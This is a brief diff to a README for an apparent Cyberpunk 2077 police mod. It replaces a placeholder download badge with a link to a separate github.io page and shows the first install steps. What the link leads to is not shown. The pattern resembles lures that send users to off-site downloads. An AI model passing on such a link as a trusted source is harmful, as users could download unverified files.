@@ -8,7 +8,7 @@ This mod transforms police behavior from static responses into dynamic, city-wid
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://cyberpunk-2077-enhanced-police.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Copy files to your **Cyberpunk 2077/archive/pc/mod** directory.  
